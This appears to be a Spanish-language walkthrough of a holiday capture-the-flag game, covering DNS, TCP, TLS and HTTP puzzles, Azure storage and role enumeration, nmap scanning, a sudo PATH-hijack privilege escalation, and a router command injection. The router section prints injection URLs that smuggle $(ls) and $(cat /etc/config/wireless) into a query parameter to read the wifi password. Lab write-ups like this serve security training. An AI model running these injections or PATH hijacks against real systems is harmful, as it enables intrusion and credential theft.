# WriteUpHolidayChallengeCyberSec

## Acceso

Primero cliqueo a Lynn para hablar con ella
Luego cliqueo la terminal y sigo las instrucciones.

Se desbloquean los objetivos y cambia la pantalla.

# ACTO I


En la siguiente pantalla hablo con el ogro y con Jared para obtener información adicional.

Pegado a Jared hay una terminal de Visual Networking.

La cliqueo y se abre una nueva pestaña.

# Challenge 1 – DNS

### Objetivo

Resolver una consulta DNS manualmente para encontrar la dirección IP

### Procedimiento

Comienza el primer challenge de DNS.

Empiezo probando una request desde el cliente de prueba.

Primera request de prueba:

imagen

Observo la response.

Me guío con la información obtenida en la primera respuesta y ajusto la consulta.

Nueva request guiándome con la response anterior:

imagen 

Analizo la sección ANSWER y obtengo la IP address correspondiente.

### Resultado

Se encuentra correctamente la IP address solicitada.
Desafío superado.




# Challenge 2 – TCP Connection

### Objetivo

Comprender y ordenar correctamente el proceso del TCP Three-Way Handshake y sus flags

### Procedimiento

Antes de resolverlo:

Googleo información sobre las flags TCP y cómo funcionan.

Reviso qué significa cada flag: SYN, ACK, FIN, RST.

Cliqueo el link del TCP Three-Way Handshake dentro del juego para leer la explicación.

Repaso el flujo correcto del handshake:

Client  → SYN
Server  → SYN-ACK
Client  → ACK

Analizo las combinaciones de flags que muestra el juego y las ordeno según el proceso correcto del establecimiento de conexión TCP.

imagen 


### Resultado

Se ordenan correctamente las flags del TCP Three-Way Handshake.
Desafío completado.

Después de completar el protocolo TCP, paso al siguiente challenge desde la terminal de Networking



# Challenge 3 – HTTP GET Request

### Objetivo
Generar manualmente una request HTTP tipo GET

### Procedimiento

Imagen

Aca simplemente hay que generar una request del tipo get para http

- selecciono get que es la response que busco
- elijo la version mas vieja de http por temas de menos seguridad
- mantengo el mismo host que ya viene configurado
- agrego como user-agent id=1 por probar que me traiga un registro
- con esto se completa el challenge

```bash
GET / HTTP/1.0
Host: <mismo_host>
User-Agent: id=1
```

### evidencia:

imagen de request y response

### Resultado

La response devuelve lo que estoy buscando
Challenge completado.



## Challenge 4 – TLS Handshake

### Objetivo
Ordenar correctamente los mensajes del TLS Handshake

### Procedimiento

Imagen

Empiezo el challenge y veo que tengo un par de errores que el juego los marca

- utilizo esos errores como guia para encontrar la solucion correcta
- analizo la comunicacion entre el cliente y el servidor
- entiendo el proceso de certificacion y validacion
- coloco los mensajes en el orden correcto segun el handshake
- una vez ordenados correctamente se completa el challenge

Flujo correcto del handshake:

- Client Hello
- Server Hello
- Certificate
- Key Exchange
- Finished

### evidencia:

imagen del orden incorrecto  
imagen del orden corregido

### Resultado

Al ordenar correctamente los mensajes segun el flujo TLS, el challenge se completa



## Challenge 5 – HTTPS GET Request

### Objetivo
Realizar una request HTTP segura (HTTPS)

### Procedimiento

Imagen

Aca por ultimo tengo que traerme una request de http segura

- ejecuto un metodo GET
- utilizo la version 2 de http
- mantengo el mismo host ya configurado
- mantengo el usuario y el user-agent ya probados anteriormente
- envio la request segura
- verifico que la response devuelva 200 ok
- confirmo que tambien me traiga el body

```bash
GET / HTTP/2
Host: <mismo_host>
User-Agent: id=1
```

### evidencia:

imagen de la request HTTPS  
imagen de la response 200 OK con body  

### Resultado

La response devuelve 200 OK y el body correctamente.
Networking completado.


## Spare Key – Azure

### Objetivo
Explorar recursos en Azure y encontrar informacion sensible en una storage account

### Procedimiento

Imagen

Para continuar hablo con el ganzo Barry  
me comenta sobre Azure  

- cliqueo la terminal cercana a el
- comienza el desafio Spare Key

Empiezo explorando comandos basicos de azure

```bash
az group list
```

Busco cuentas de storage dentro del resource group

```bash
az storage account list --resource-group rg-the-neighborhood -o table
```

Personalizo los comandos con el nombre encontrado anteriormente:
neighborhoodhoa

Intento listar contenedores

```bash
az storage container list --account-name neighborhoodhoa
```

Me devuelve error de permisos  
Reviso y agrego modo de autenticacion

```bash
az storage container list --account-name neighborhoodhoa --auth-mode login
```

Ahora intento listar los blobs

```bash
az storage blob list --account-name neighborhoodhoa --container-name public --auth-mode login
```

No devuelve lo esperado  
Reviso nuevamente y pruebo con el contenedor que habia visto antes llamado '$web'

```bash
az storage blob list --account-name neighborhoodhoa --container-name '$web' --auth-mode login
```

Esto devuelve el listado de archivos  

Analizo los archivos y veo uno sospechoso:
terraform.tfvars  
Aparece un warning de "leaked secrets"

Decido descargar su contenido

```bash
az storage blob download \
--account-name neighborhoodhoa \
--container-name '$web' \
--name 'iac/terraform.tfvars' \
--file /dev/stdout \
--auth-mode login
```

Esto muestra el contenido directamente en consola

### evidencia:

imagen del listado de blobs  
imagen del terraform.tfvars con leaked secrets  

### Resultado

Se logra acceder al archivo terraform.tfvars con informacion sensible.
Primer desafio de Azure completado.


## Storage Secrets – Azure

### Objetivo
Encontrar credenciales expuestas en una storage account con acceso publico

### Procedimiento

Imagen

Para continuar me dirijo a hablar con Grace  
cliqueo la consola mas proxima a ella  
comienza el desafio Storage Secrets

Empiezo ejecutando ayuda para conocer comandos

```bash
az help | less
```

Importante usar | less para poder scrollear en la terminal

Listo las cuentas disponibles

```bash
az account list | less
```

Luego pruebo listar storage accounts

```bash
az storage account list | less
```

Scrolleo la respuesta buscando algo llamativo o sospechoso  

Encuentro una cuenta con public access en true  
Decido inspeccionarla

```bash
az storage account show --name neighborhood2 | less
```

Ahora necesito listar sus contenedores

```bash
az storage container list --account-name neighborhood2
```

Esto devuelve los contenedores disponibles

Decido inspeccionar el contenedor public

```bash
az storage blob list --account-name neighborhood2 --container-name public
```

Esto devuelve el contenido del contenedor  

Veo un archivo llamado:
admin_credentials.txt

Decido descargarlo usando el mismo comando que en el desafio anterior

```bash
az storage blob download \
--account-name neighborhood2 \
--container-name public \
--name admin_credentials.txt \
--file /dev/stdout \
--auth-mode login
```

Esto muestra el contenido del archivo directamente en consola

### evidencia:

imagen del storage account con public access true  
imagen del blob list  
imagen del contenido de admin_credentials.txt  

### Resultado

Se accede al archivo admin_credentials.txt con credenciales expuestas.
Desafio completado.

## Santa’s Tracking Service

### Objetivo
Encontrar el puerto correcto en el que esta corriendo el servicio santa_tracker y conectarse a el

### Procedimiento

Imagen

Para continuar me dirijo a hablar con Yori  
me muestra una terminal cURL para trabajar  
comienza el desafio Santa’s Tracking Service

El objetivo es ver que puerto se esta usando en lugar del 8080 y conectarlo

Primero ejecuto el comando sugerido para ver que procesos estan escuchando y en que puertos

```bash
ss -tlnp
```

La terminal muestra los procesos activos  
Veo que hay un solo proceso escuchando  
Asumo que es el santa_tracker  

Identifico que esta corriendo en el puerto 12321

Para verificar que este funcionando correctamente hago una request local

```bash
curl localhost:12321
```

La respuesta confirma que el servicio esta activo y funcionando

### evidencia:

imagen del resultado de ss -tlnp  
imagen del curl localhost:12321  

### Resultado

Se identifica el puerto correcto (12321) y se logra conectar al servicio.
Desafio completado.


## Fishing – It’s All About Defang

### Objetivo
Extraer todos los dominios, IPs, URLs y direcciones de email sospechosas del mail y defangearlos

### Procedimiento

Imagen

Para continuar me dirijo al City Hall, segundo piso  
hablo con Ed Skoudis  
comienza el desafio Fishing – It’s All About Defang

Se muestra el contenido de un mail sospechoso  

El desafio pide extraer:

- dominios
- ips
- urls
- direcciones de email

Analizo el contenido del mail buscando patrones comunes de IOC

Cada dominio termina en .algo  
Cada ip son numeros separados por puntos  
Cada email contiene @  
Cada url comienza con http o https  

Voy a la pestaña Reference y copio los Common IOC Patterns  

Los pego en sus respectivos extractores  

Para IPs uso el patron:

```bash
\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
```

Noto que faltan algunas IPs  
Modifico levemente el patron para que capture todas

Para URLs modifico el patron original de http a https? para que abarque todos los protocolos

```bash
https?://[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)+(:[0-9]+)?(/[^\s]*)?
```

Luego reviso manualmente los resultados y elimino los que no son sospechosos  
Descarto los que pertenecen a la corporacion legitima  

Me quedo con:

Dominios:

mail.icicleinnovations.mail  
dosisneighborhood.corp  

IPs:

172.16.254.1  
10.0.0.5  
192.168.1.1  
172.16.254.1  
523.555.0100  
523.555.0101  

URLs:

https://icicleinnovations.mail/renovation-planner.exe  
https://icicleinnovations.mail/upload_photos  

Emails:

sales@icicleinnovations.mail  
residents@dosisneighborhood.corp  
holiday2025-kitchen@dosisneighborhood.corp  
info@icicleinnovations.mail  

Ahora hay que defangear todo para que deje de ser clickable

Uso el convertidor con:

```bash
s/\./[.]/g; s/@/[@]/g; s/http/hxxp/g; s/:\//[://]/g
```

Esto convierte todos los indicadores a formato seguro

### evidencia:

imagen del mail original  
imagen de los extractores  
imagen de los IOC defangeados  

### Resultado

Se identifican correctamente todos los indicadores sospechosos y se defangean para enviarlos al equipo de seguridad.
Desafio completado.




## Holiday Firewall Simulator

### Objetivo
Configurar correctamente las reglas del firewall segun las practicas de seguridad indicadas

### Procedimiento

Imagen

Para continuar entro al hotel  
voy a la habitacion de maquinas  
hablo con Chris  
selecciono la visual firewall  
comienza el desafio Holiday Firewall Simulator

Se presentan distintas conexiones del firewall para configurar  

Lo que hago es:

- revisar la informacion que proporciona el desafio sobre cada tipo de conexion
- analizar que conexiones deben estar permitidas
- configurar solamente los puertos que corresponden
- bloquear los que no estan especificados como permitidos

Por ejemplo:

Las workstations permiten todo el trafico  
Entonces configuro todos los puertos como permitidos para ese segmento

En los otros segmentos reviso:

- puertos especificos
- protocolos
- direccion del trafico (inbound / outbound)
- principio de menor privilegio

Voy ajustando las reglas hasta que todas queden correctamente configuradas segun lo indicado

### evidencia:

imagen de la configuracion inicial  
imagen de las reglas configuradas correctamente  

### Resultado

Se configuran correctamente las reglas del firewall aplicando buenas practicas de seguridad.
Desafio completado.



## The Open Door – Azure NSG

### Objetivo
Inspeccionar las Network Security Groups (NSG) y detectar una regla sospechosa

### Procedimiento

Imagen

Salgo del hotel  
voy a la parte de atras  
hablo con el ganzo Lucas  
toco la terminal a su lado  
comienza el desafio The Open Door

Primero me pide ejecutar:

```bash
az group list
```

La respuesta devuelve un JSON  
Para verlo mas claro ejecuto:

```bash
az group list
```

Imagen del output en tabla

Luego me pide listar las networks:

```bash
az network nsg list -o table
```

Imagen del listado de NSG

Para inspeccionar una en particular ejecuto:

```bash
az network nsg show --name nsg-web-eastus --resource-group theneighborhood-rg1 | less
```

Scrolleo para revisar configuracion

Ahora quiero listar las reglas:

```bash
az network nsg rule list --nsg-name nsg-mgmt-eastus --resource-group theneighborhood-rg2 -o table
```

Imagen del listado de reglas

Tambien reviso las default security rules permitidas:

```bash
az network nsg show --name nsg-web-eastus --resource-group theneighborhood-rg1 --query "defaultSecurityRules[?access=='Allow']" -o table
```

```bash
az network nsg show --name nsg-mgmt-eastus --resource-group theneighborhood-rg2 --query "defaultSecurityRules[?access=='Allow']" -o table
```

Luego vuelvo a listar reglas completas:

```bash
az network nsg rule list -g theneighborhood-rg2 --nsg-name nsg-mgmt-eastus
```

Empiezo a analizar:

- puertos abiertos
- protocolos
- direccion del trafico
- reglas demasiado permisivas

Identifico una regla que me parece sospechosa:

Allow-AD-Identity-Outbound

La inspecciono directamente:

```bash
az network nsg rule show -g theneighborhood-rg2 --nsg-name nsg-mgmt-eastus -n Allow-AD-Identity-Outbound
```

Imagen del detalle de la regla

### Resultado

Se identifica la regla sospechosa dentro de las NSG
Desafio completado.


## Intro to Nmap

### Objetivo
Realizar escaneos con nmap para identificar puertos abiertos y servicios activos

### Procedimiento

Imagen

Para continuar me dirijo al estacionamiento del hotel  
interactuo con Eric  
selecciono su moto  
comienza el desafio Intro to Nmap

Primero en la terminal aparece el mensaje indicando que cuando se ejecuta sin opciones, nmap realiza un escaneo TCP de los 1000 puertos mas comunes

Me pide escanear la direccion:

127.0.12.25

Ejecuto:

```bash
nmap 127.0.12.25
```

Imagen del resultado inicial

El resultado no es muy especifico  
Decido hacer un escaneo completo de todos los puertos:

```bash
nmap 127.0.12.25
```

Imagen del escaneo completo

Luego el desafio pide escanear un rango de direcciones IP

Ejecuto:

```bash
nmap 127.0.12.20-28
```

Imagen del escaneo de rango

Ahora me dice que nmap puede identificar que servicios corren en cada puerto  
Pregunta que servicio esta corriendo en el puerto 8080

Agrego la opcion -sV para detectar versiones:

```bash
nmap 127.0.12.25 -p 8080 -sV
```

Imagen mostrando el servicio en 8080

Luego indica que puedo usar ncat para interactuar con un puerto especifico  
Debo conectarme al puerto 24601 en la direccion 127.0.12.25

Ejecuto:

```bash
ncat 127.0.12.25 24601
```

Imagen mostrando la conexion exitosa

### Resultado

Se identifican los puertos abiertos, los servicios activos y se logra interactuar con el puerto indicado.
Desafio completado.



## The Owner – Azure

### Objetivo
Identificar que suscripcion tiene un rol Owner asignado mediante PIM y analizar la membresia del grupo

### Procedimiento

Imagen

Para continuar me dirijo al parque  
interactuo con el ganzo James  
selecciono la terminal cercana a el  
comienza el desafio The Owner

Primero me pide ejecutar:

```bash
az account list --query "[].name"
```

Esto devuelve un array con los nombres de las suscripciones

Imagen del output con las suscripciones

Luego me indica usar queries mas avanzadas con filtros condicionales  

Ejecuto:

```bash
az account list --query "[?state=='Enabled'].{Name:name, ID:id}"
```

Esto devuelve las suscripciones habilitadas con su ID correspondiente

Imagen del output con Name e ID

Ahora debo revisar que suscripcion tiene el rol Owner asignado  

Para eso ejecuto el siguiente comando reemplazando el ID por el correspondiente

```bash
az role assignment list --scope "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64" --query "[?roleDefinitionName=='Owner']"
```

Repito el mismo procedimiento con los demas IDs:

```bash
az role assignment list --scope "/subscriptions/4d9dbf2a-90b4-4d40-a97f-dc51f3c3d46e" --query "[?roleDefinitionName=='Owner']"
```

```bash
az role assignment list --scope "/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3a617" --query "[?roleDefinitionName=='Owner']"
```

```bash
az role assignment list --scope "/subscriptions/681c0111-ca84-47b2-808d-d8be2325b380" --query "[?roleDefinitionName=='Owner']"
```

En el grupo 3 aparece algo interesante  
Indica que el grupo esta habilitado mediante PIM

Imagen mostrando el grupo habilitado por PIM

Ahora debo investigar la membresia de ese grupo  

Intento listar los miembros usando el group ID que aparece:

```bash
az ad member list --group 6b452f58-6872-4064-ae9b-78742e8d987e
```

No devuelve lo esperado  

Reviso y pruebo usando el principalId encontrado en la respuesta anterior:

```bash
az ad member list --group 6b982f2f-78a0-44a8-b915-79240b2b4796
```

Imagen del resultado mostrando que es un grupo anidado

Ahora ejecuto nuevamente el mismo comando pero con el ID del grupo anidado:

```bash
az ad member list --group 631ebd3f-39f9-4492-a780-aef2aec8c94e
```

Imagen mostrando los permanent assignments

### Resultado

Se identifica la suscripcion con rol Owner habilitado por PIM y se obtiene la membresia final del grupo.
Desafio completado.



## Neighborhood Watch Bypass

### Objetivo
Escalar privilegios y obtener permisos elevados explotando configuraciones de sudo

### Procedimiento

Imagen

Para continuar me dirijo al antiguo datacenter  
hablo con Kyle el bombero  
selecciono la alarma de incendios  
comienza el desafio Neighborhood Watch Bypass

El objetivo es saltear las restricciones vigentes y darle privilegios elevados solo al admin  

Primero verifico que permisos sudo tengo disponibles:

```bash
sudo -l
```

Imagen del output mostrando el script permitido

El resultado muestra que puedo ejecutar:

/usr/local/bin/system_status.sh

Ahora quiero inspeccionar ese script  

Reviso el PATH:

```bash
echo $PATH
```

Esto devuelve que tengo acceso a:

/home/chiuser/bin

Imagen mostrando el PATH

Listo el contenido del directorio:

```bash
ls -la /home/chiuser/bin/
```

Imagen del listado

Veo algo llamativo:

runtoanswer -> /etc/firealarm/restore_fire_alarm

Intento ejecutarlo directamente:

```bash
/etc/firealarm/restore_fire_alarm
```

Me devuelve error de permisos  

Entonces decido crear un archivo llamado free dentro de /home/chiuser/bin

Primero me aseguro de estar en el directorio correcto:

```bash
cd /home/chiuser/bin
```

Creo el archivo:

```bash
nano free
```

Dentro del archivo agrego el comando:

```bash
/etc/firealarm/restore_fire_alarm
```

Guardo con Ctrl+O  
Confirmo nombre  
Salgo con Ctrl+X  

Ahora le doy permisos de ejecucion:

```bash
chmod 777 free
```

Imagen mostrando permisos asignados

Finalmente ejecuto el script permitido con sudo:

```bash
sudo /usr/local/bin/system_status.sh
```

El sistema ejecuta el archivo dentro de free y logra restaurar el archivo necesario

Imagen mostrando ejecucion exitosa

### Resultado

Se logra escalar privilegios aprovechando el PATH y permisos de sudo.
Desafio completado.






# ACTO II

## Dosis Network Down

### Objetivo
Encontrar la contraseña del wifi explotando una vulnerabilidad en el router

### Procedimiento

Imagen

Para este acto utilizo una maquina virtual Kali Linux  

Me dirijo al 24  
hablo con Januz Jasinski  
me dice que han cambiado la contraseña del wifi  

Selecciono el router para intentar encontrarla en su configuracion  

Se abre una pagina de login

Imagen del login del router

Empiezo probando contraseñas comunes:

password  
password123  
notpassword  

Luego del tercer intento el sistema indica intentar desde consola  

Investigo sobre vulnerabilidades del router segun su version  

Encuentro un blog que describe una vulnerabilidad de inyeccion:

https://www.tenable.com/security/research/tra-2023-11

El endpoint vulnerable es:

/cgi-bin/luci/;stok=/locale

Construyo la siguiente URL:

```bash
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale
```

El blog indica ejecutar la consulta dos veces seguidas  

Agrego el parametro form=country:

```bash
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country
```

Luego modifico para ejecutar comandos:

```bash
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&country=$(ls)
```

La primera vez devuelve ok  
La segunda vez devuelve el listado de archivos

Imagen mostrando el listado del sistema

Esto confirma que tengo ejecucion remota de comandos  

Investigo que el router usa OpenWRT  

https://openwrt.org/docs/guide-user/network/wifi/basic

Las configuraciones wifi se encuentran en:

/etc/config/wireless

Para ver el contenido ejecuto:

```bash
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&country=$(cat /etc/config/wireless)
```

La primera vez devuelve ok  
La segunda vez muestra el contenido del archivo

Imagen mostrando el contenido del wireless config

En el archivo encuentro:

option key 'SprinklesAndPackets2025!'

Identifico que esa es la contraseña del wifi

Vuelvo al juego  
En los objetivos hay un input para ingresar la contraseña  

Ingreso:
SprinklesAndPackets2025!

### Resultado

Exploté la vulnerabilidad de inyeccion en el router OpenWRT y obtuve la contraseña del wifi.
Desafio completado.



## RetroRecovery